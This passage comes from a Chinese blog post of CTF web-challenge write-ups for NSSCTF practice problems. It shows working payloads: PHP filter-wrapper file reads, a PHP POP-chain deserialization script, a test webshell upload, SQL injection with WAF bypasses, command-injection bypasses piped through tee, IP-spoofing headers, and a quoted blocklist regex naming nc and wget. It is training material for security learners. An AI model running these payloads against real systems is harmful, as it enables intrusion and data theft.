class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;手拿把掐，直接利用PHP伪协议<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，得到Base64加密的flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2640_%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81.png" title="2640_编码解码"></p><p>&emsp;&emsp;根据提示，目标文件名应当是flag，尝试直接在URL后加上&#x2F;flag，出现答案</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2640_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2640_结果展示"></p><p>&emsp;&emsp;回头看WriteUp的时候，发现也可以二次使用PHP伪协议，令resource&#x3D;flag即可</p><h2 id="440-SWPUCTF-2021-新生赛-pop-–反序列化-–pop链-–-toString-调用前提"><a href="#440-SWPUCTF-2021-新生赛-pop-–反序列化-–pop链-–-toString-调用前提" class="headerlink" title="440_[SWPUCTF 2021 新生赛]pop –反序列化 –pop链 –__toString()调用前提"></a>440_[SWPUCTF 2021 新生赛]pop –反序列化 –pop链 –<code>__toString()</code>调用前提</h2><p>&emsp;&emsp;进入环境，明确知识点为反序列化，需要传入参数w00m，尝试构造类w44m的序列化代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?w00m=O:<span class="number">4</span>:<span class="string">&quot;w44m&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;\x00w440\x00admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;w44m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;\x00*\x00passwd&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;08067&quot;</span>;&#125;</span><br><span class="line">/?w00m=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>w44m%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>w44m%<span class="number">00</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>w44m%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>passwd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">2208067</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;发现没有东西，甚至连“nono”都没有，再查反序列化知识点，发现有个知识点很契合题目“pop”：pop链序列化</p><p>&emsp;&emsp;<strong>pop链序列化</strong>：利用魔法方法在里面进行多次跳转，pop链的尾部是关键属性或漏洞函数，从尾至头递推</p><p>&emsp;&emsp;于是重新分析PHP代码，以获得flag为目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获得flag：验证admin=&quot;w44m&quot;&amp;&amp;passwd=&quot;08067&quot;</span><br><span class="line">验证admin=&quot;w44m&quot;&amp;&amp;passwd=&quot;08067&quot;：调用Getflag()</span><br><span class="line">调用Getflag()：w33m中调用$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()</span><br><span class="line">w33m中调用$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()：__toString()调用</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里出现了疑惑：__toString()魔术方法在什么时候能够被调用？</p><table><thead><tr><th align="center">调用前提</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">对象被当作字符串处理</td><td align="center">当对象需要使用<code>echo</code>、<code>print</code>语句输出，或在字符串连接操作（如使用<code>.</code>运算符）中涉及对象时，<code>__toString()</code>方法会被自动调用。</td></tr><tr><td align="center">方法存在于类中</td><td align="center"><code>__toString()</code>方法必须在类中显式定义。如果类中未定义此方法，而对象又被当作字符串处理，则会抛出一个<code>Catchable fatal error</code>错误。</td></tr><tr><td align="center">适用于所有需要将对象转为字符串的场景</td><td align="center">在任何需要将对象转换为字符串的场景中，如果定义了<code>__toString()</code>方法，PHP都会尝试调用它来完成转换。这包括函数调用参数需要字符串类型、文件写入操作需要字符串数据等。</td></tr></tbody></table><p>&emsp;&emsp;这就很明白了，可以续上pop链了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString()调用：echo $this-&gt;w00m调用</span><br><span class="line">echo $this-&gt;w00m调用：w22m的__destruct()调用，即其被析构</span><br><span class="line">w22m的__destruct()调用：w22m的创建</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;综上，最外层应当创建w22m的对象，且相应参数应如下</p><table><thead><tr><th align="center">参数</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">w22m：w00m，s:4:”w00m”;</td><td align="center">类w33m的实例</td></tr><tr><td align="center">w33m：w00m，s:4:”w00m”;</td><td align="center">类w44m的实例</td></tr><tr><td align="center">w33m：w22m，s:4:”w22m”;</td><td align="center">s:7:”Getflag”;</td></tr><tr><td align="center">w44m：admin，s:5:”\00w44m\00admin”;</td><td align="center">s:4:”w44m”;</td></tr><tr><td align="center">w44m：passwd，s:6:”\00*\00passwd”;</td><td align="center">s:5:”08067”;</td></tr></tbody></table><p>&emsp;&emsp;这里就不自己推序列化字串了，用.php脚本自己跑，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;结算画面(ﾉ･ｪ･)ﾉ(ﾉ･ｪ･)ﾉ(ﾉ･ｪ･)ﾉ</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/440_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="440_结果展示"></p><h2 id="3867-LitCTF-2023-作业管理系统-–文件上传"><a href="#3867-LitCTF-2023-作业管理系统-–文件上传" class="headerlink" title="3867_[LitCTF 2023]作业管理系统 –文件上传"></a>3867_[LitCTF 2023]作业管理系统 –文件上传</h2><p>&emsp;&emsp;进入环境，F12网页检查，发现出现提示信息<code>&lt;!--默认账户admin admin--&gt;</code>，输入后得到下一界面</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3867_%E7%AC%AC%E4%BA%8C%E7%95%8C%E9%9D%A2.png" title="3867_第二界面"></p><p>&emsp;&emsp;看左侧的功能框，推测是文件上传的知识点，上传个一句话木马试试水<code>&lt;?php phpinfo();?&gt;</code>，然后直接访问上传上去的文件</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3867_phpinfo.png" title="3867_phpinfo"></p><p>&emsp;&emsp;好吧，接着试呗，<code>ls /</code></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3867_ls.png" title="3867_ls"></p><p>&emsp;&emsp;剩下就简单了，<code>cat /flag</code>出现答案</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3867_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3867_结果展示"></p><h2 id="3053-UUCTF-2022-新生赛-websign"><a href="#3053-UUCTF-2022-新生赛-websign" class="headerlink" title="3053_[UUCTF 2022 新生赛]websign"></a>3053_[UUCTF 2022 新生赛]websign</h2><p>&emsp;&emsp;进入环境，告诉我源代码里有东西，可是我怎么按不出来F12？</p><p>&emsp;&emsp;没事，我还可以<code>curl -v url</code>，直接在Window命令行中拿到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3053_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3053_结果展示"></p><h2 id="2422-鹏城杯-2022-简单包含-–文件包含漏洞-–脏数据伪协议绕过"><a href="#2422-鹏城杯-2022-简单包含-–文件包含漏洞-–脏数据伪协议绕过" class="headerlink" title="2422_[鹏城杯 2022]简单包含 –文件包含漏洞 –脏数据伪协议绕过"></a>2422_[鹏城杯 2022]简单包含 –文件包含漏洞 –脏数据伪协议绕过</h2><p>&emsp;&emsp;进入环境得到PHP代码和flag位置提示，直接一个PHP伪协议读文件</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2422_waf%E6%8B%A6%E6%88%AA.png" title="2422_waf拦截"></p><p>&emsp;&emsp;题目以及提示信息都表明考察文件包含漏洞，故考虑页面waf的对象是过滤器和目标文件，反复尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag=flag                             # waf</span><br><span class="line">flag=php                              # 无</span><br><span class="line">flag=read                             # 无</span><br><span class="line">flag=resource                         # 无</span><br><span class="line">flag=filter                           # 无</span><br><span class="line">flag=/                                # 无</span><br><span class="line">flag=.                                # 无</span><br><span class="line">flag=-                                # 无</span><br><span class="line">flag=:                                # 无</span><br><span class="line">flag=covert.base64-encode             # 无</span><br><span class="line">flag=php://filter/read=covert.base64-encode/resource=.php             # 无</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;很明显了，拦截的就是flag，但是实在是绕不过去，看了WriteUp才拿到flag；学到了新方法：<strong>添加脏数据，即利用<code>&amp;</code>添加无关信息</strong></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2422_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2422_结果展示"></p><h2 id="442-SWPUCTF-2021-新生赛-sql-–SQL注入-–空格绕过-–等号绕过-–注释符绕过-–substr-绕过"><a href="#442-SWPUCTF-2021-新生赛-sql-–SQL注入-–空格绕过-–等号绕过-–注释符绕过-–substr-绕过" class="headerlink" title="442_[SWPUCTF 2021 新生赛]sql –SQL注入 –空格绕过 –等号绕过 –注释符绕过 –substr()绕过"></a>442_[SWPUCTF 2021 新生赛]sql –SQL注入 –空格绕过 –等号绕过 –注释符绕过 –substr()绕过</h2><p>&emsp;&emsp;进入环境，让我输点东西，先看看网页源码(其实看标签页名也可以)</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/442_%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81.png" title="442_网页源码"></p><p>&emsp;&emsp;输入wllm参数，弹出提示消息，根据题目认定为SQL注入(这个图跟387一模一样)，进行尝试：<code>wllm=1&#39; order by 3--+</code>，很好，被拦截了，看看是哪些被拦截了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=1                      # 输出提示信息</span><br><span class="line">/?wllm=1&#x27;                     # 报错但无waf</span><br><span class="line">/?wllm=1&#x27; order by            # waf</span><br><span class="line">/?wllm=1&#x27; order               # waf</span><br><span class="line">/?wllm=1&#x27; o                   # waf</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;初步明确为空格被程序所拦截，可是又不会T _ T T _ T T _ T，查阅资料，结合WriteUp整理手段如下</p><table><thead><tr><th align="center">手段</th><th align="center">演示</th></tr></thead><tbody><tr><td align="center">空格绕过&#x2F;**&#x2F;</td><td align="center"><code>1&#39;/**/order/**/by/**/3--+#</code></td></tr><tr><td align="center">空格绕过&#x2F;&#x2F;</td><td align="center"><code>1&#39;//order//by//3--+#</code></td></tr><tr><td align="center">注释绕过%23</td><td align="center"><code>1&#39; order by 3--+%23</code></td></tr><tr><td align="center">等号绕过like</td><td align="center"><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like &#39;test_db&#39;#</code></td></tr><tr><td align="center">substr()绕过mid()</td><td align="center"><code>1&#39; union select 1,mid(flag,25,30),3</code></td></tr></tbody></table><p>&emsp;&emsp;综上，尝试编写SQL语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=2&#x27;/**/order/**/by/**/3--+%23      # waf</span><br><span class="line">/?wllm=2&#x27;/**/order/**/by/**/3%23         # 正常无信息</span><br><span class="line">/?wllm=2&#x27;/**/order/**/by/**/4%23         # Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,database()%23         # test_db</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata%23</span><br><span class="line">=&gt; information_schema,m</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">=&gt; LTLT_flag,users</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">=&gt; id,flag,id,username,</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,flag/**/from/**/LTLT_flag%23</span><br><span class="line">=&gt; NSSCTF&#123;1b668c71-2ca7</span><br><span class="line"># 现在可以找后半段flag</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,mid(flag,20,40)/**/from/**/LTLT_flag%23</span><br><span class="line">=&gt; 7-47be-adaf-0b52bbbc</span><br><span class="line">/?wllm=2&#x27;/**/union/**/select/**/1,2,mid(flag,40,60)/**/from/**/LTLT_flag%23</span><br><span class="line">=&gt; 5fcb&#125;</span><br><span class="line"># 综上得到flag：NSSCTF&#123;1b668c71-2ca7-47be-adaf-0b52bbbc5fcb&#125;</span><br></pre></td></tr></table></figure><h2 id="438-SWPUCTF-2021-新生赛-finalrce-–Linux指令绕过-–tee指令"><a href="#438-SWPUCTF-2021-新生赛-finalrce-–Linux指令绕过-–tee指令" class="headerlink" title="438_[SWPUCTF 2021 新生赛]finalrce –Linux指令绕过 –tee指令"></a>438_[SWPUCTF 2021 新生赛]finalrce –Linux指令绕过 –tee指令</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># GET方式传入url参数</span><br><span class="line">$url=$_GET[&#x27;url&#x27;];</span><br><span class="line"># 正则表达式绕过</span><br><span class="line">if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line"># 魔术方法使用</span><br><span class="line">exec($url);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;首先来学习一下exec()</p><p>&emsp;&emsp;<code>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</code>，用于执行外部程序，无回显</p><table><thead><tr><th align="center">参数名</th><th align="center">类型</th><th align="center">可选</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center"><code>$command</code></td><td align="center"><code>string</code></td><td align="center">否</td><td align="center">要执行的外部命令或程序的字符串表示</td></tr><tr><td align="center"><code>$output</code></td><td align="center"><code>array</code></td><td align="center">是</td><td align="center">命令的完整输出结果将作为数组存储在此变量中，每个数组元素代表命令输出的一行</td></tr><tr><td align="center"><code>$return_var</code></td><td align="center"><code>int</code></td><td align="center">是</td><td align="center">命令执行后的退出状态码将存储在此变量中，退出状态码 <code>0</code> 表示成功，非零值表示错误</td></tr></tbody></table><p>&emsp;&emsp;查阅资料，发现对于一般的Linux指令的屏蔽，可以使用如下绕过</p><table><thead><tr><th align="center">方法</th><th align="center">演示</th></tr></thead><tbody><tr><td align="center">单引号绕过</td><td align="center"><code>l&#39;&#39;s</code></td></tr><tr><td align="center">双引号绕过</td><td align="center"><code>l&quot;&quot;s</code></td></tr><tr><td align="center">反斜杠绕过</td><td align="center"><code>l\s</code></td></tr></tbody></table><p>&emsp;&emsp;显然，本题适用第一、三种方式；接下来需要解决exec()无回显的问题，我们可以将上个命令的输出存于文件，通过访问文件得到结果，有以下两种方法</p><table><thead><tr><th align="center">方法</th><th align="center">演示</th></tr></thead><tbody><tr><td align="center"><code>&gt;</code>输入符</td><td align="center"><code>ls / &gt; output.txt</code></td></tr><tr><td align="center"><code>tee</code>指令</td><td align="center">&#96;ls &#x2F;</td></tr></tbody></table><p>&emsp;&emsp;显然，本题仅适用第二种方法；问题解决后，来尝试编写url参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?url=l\s / | tee output.txt</span><br><span class="line">/output.txt</span><br><span class="line">=&gt; a_here_is_a_f1ag bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line">/?url=ca\t /flllll\aaaaaaggggggg | tee output.txt         # la也被拦截</span><br><span class="line">/output.txt</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;flag结算画面</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/438_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="438_结果展示"></p><h2 id="3869-LitCTF-2023-Http-pro-max-plus-–HTTP请求IP更改-–Referer信息头-–Via信息头"><a href="#3869-LitCTF-2023-Http-pro-max-plus-–HTTP请求IP更改-–Referer信息头-–Via信息头" class="headerlink" title="3869_[LitCTF 2023]Http pro max plus –HTTP请求IP更改 –Referer信息头 –Via信息头"></a>3869_[LitCTF 2023]Http pro max plus –HTTP请求IP更改 –Referer信息头 –Via信息头</h2><p>&emsp;&emsp;进入环境，看到题目名HTTP，先<code>curl</code>尝尝咸蛋</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_curl%E7%BB%93%E6%9E%9C.png" title="3869_curl结果"></p><p>&emsp;&emsp;没啥东西，根据提示，猜测题目类同385，利用BurpSuite抓包修改一下X-Forwarded-For信息头</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_XFF%E7%BB%93%E6%9E%9C.png" title="3869_XFF结果"></p><p>&emsp;&emsp;ψ(｀∇´)ψ好好好，被拿下了，又去搜其他方法，才发现巨多</p><table><thead><tr><th align="center">信息头</th><th align="center">信息</th></tr></thead><tbody><tr><td align="center">client-ip</td><td align="center">127.0.0.1</td></tr><tr><td align="center">Forwarded-For-fp</td><td align="center">127.0.0.1</td></tr><tr><td align="center">Forwarded-For</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">Forwarded</td><td align="center">127.0.0.1， localhost</td></tr><tr><td align="center">True-Client-IP</td><td align="center">127.0.0.1</td></tr><tr><td align="center">X-Client-IP</td><td align="center">127.0.0.1</td></tr><tr><td align="center">X-Custom-IP-Authorization</td><td align="center">127.0.0.1</td></tr><tr><td align="center">X-Forward-For</td><td align="center">127.0.0.1</td></tr><tr><td align="center">X-Forward</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Forwarded-By</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Forwarded-For-Original</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Forwarded-Server</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Forwarded</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Forwared-Host</td><td align="center">127.0.0.1，localhost</td></tr><tr><td align="center">X-Host</td><td align="center">127.0.0.1</td></tr></tbody></table><p>&emsp;&emsp;挨个试试，第一个就可以</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_client%E7%BB%93%E6%9E%9C.png" title="3869_client结果"></p><p>&emsp;&emsp;又是个我没见过的东西，不过还好，文心一言认识</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80.png" title="3869_文心一言"></p><p>&emsp;&emsp;再加个Referer信息头试试，又说是要Chrome浏览器，这个我会，改User-Agent就好</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_%E4%BB%A3%E7%90%86%E8%A6%81%E6%B1%82.png" title="3869_代理要求"></p><p>&emsp;&emsp;OK，这个“代理服务器地址”我也不知道用哪个信息头，不过文心一言依旧有用</p><p><img src="/3869_%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8.png" title="3869_代理服务器"></p><p>&emsp;&emsp;接着试试，这下终于给东西了，进入&#x2F;wtfwtfwtfwtf.php，又被秀一脸</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_%E8%89%B2PHP.png" title="3869_色PHP"></p><p>&emsp;&emsp;再次进入提示文件，终于不用受折磨了，拿到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3869_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3869_结果展示"></p><h2 id="3786-HDCTF-2023-Welcome-To-HDCTF-2023-–JSFuck"><a href="#3786-HDCTF-2023-Welcome-To-HDCTF-2023-–JSFuck" class="headerlink" title="3786_[HDCTF 2023]Welcome To HDCTF 2023 –JSFuck"></a>3786_[HDCTF 2023]Welcome To HDCTF 2023 –JSFuck</h2><p>&emsp;&emsp;进入环境，好玩！直接拿到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3786_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3786_结果展示"></p><p>&emsp;&emsp;当然，好好去做题练习的话，还是<code>ctrl+U</code>看看网页源代码吧，在<code>[assets/js/game.js]</code>中，直接下翻，会出现熟悉的JSFuck加密信息，解密即获得flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3786_JSFuck.png" title="3786_JSFuck"></p><h2 id="3866-LitCTF-2023-Vim-yyds-–vim泄露-–-swp文件恢复"><a href="#3866-LitCTF-2023-Vim-yyds-–vim泄露-–-swp文件恢复" class="headerlink" title="3866_[LitCTF 2023]Vim yyds –vim泄露 –.swp文件恢复"></a>3866_[LitCTF 2023]Vim yyds –vim泄露 –.swp文件恢复</h2><p>&emsp;&emsp;(刷题刷到这里发现攒的金币不够了，忍痛冲了￥9.8，NSS你苟富贵勿相忘啊)</p><p>&emsp;&emsp;进入环境，一脸懵圈，连思路都没有，看标题果断去查关键字“CTF，Web，Vim”，出来点有用东西</p><p>&emsp;&emsp;<strong>vim缓存</strong>：当开发人员在线上环境中使用vim编辑器，在使用过程中会留下vim编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露，包含两个后缀</p><table><thead><tr><th align="center">后缀</th><th align="center">释义</th></tr></thead><tbody><tr><td align="center">.文件名(包含后缀).swp</td><td align="center">用于记录未保存的更改，以防主文件，即你正在编辑的文件损坏或被删除</td></tr><tr><td align="center">.文件名(包含后缀).swo</td><td align="center">用于支持Vim的会话恢复功能，即保存多个文件的状态以便在Vim崩溃后恢复</td></tr></tbody></table><p>&emsp;&emsp;也即表示我们需要找到后缀为.swp的文件并对其进行恢复，先找到；可是我源码和包都看了看，没给提示，没办法，只有扫目录了(这次专门为这道题给Level_1字典中所有.php路径加了对应的.swp，整理为Level_2好了)</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3866_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="3866_目录扫描结果"></p><p>&emsp;&emsp;找到马脚，由于Windows没有Vim，开个Kali用，先wget把东西下下来，然后根据进程恢复，得到真正的源码</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3866_%E7%9C%9F%E5%AE%9E%E6%BA%90%E7%A0%81.png" title="3866_真实源码"></p><p>&emsp;&emsp;审计关键代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ($_POST[&#x27;password&#x27;] === base64_encode($password))</span><br><span class="line"># 如果POST传入的password参数值等于base64编码的$password</span><br><span class="line">eval(system($_POST[&#x27;cmd&#x27;]))</span><br><span class="line"># 执行POST方式传入的参数cmd</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这下不就简单了，$password的编码是<code>R2l2ZV9NZV9Zb3VyX0ZsYWc=</code>，只需要通过不断执行不同cmd即可出现结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=ls /</span><br><span class="line">=&gt; bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var </span><br><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;结算画面☟</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3866_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3866_结果展示"></p><h2 id="2076-NSSCTF-2022-Spring-Recruit-babyphp-–强比较-–弱比较-–intval"><a href="#2076-NSSCTF-2022-Spring-Recruit-babyphp-–强比较-–弱比较-–intval" class="headerlink" title="2076_[NSSCTF 2022 Spring Recruit]babyphp –强比较 –弱比较 –intval()"></a>2076_[NSSCTF 2022 Spring Recruit]babyphp –强比较 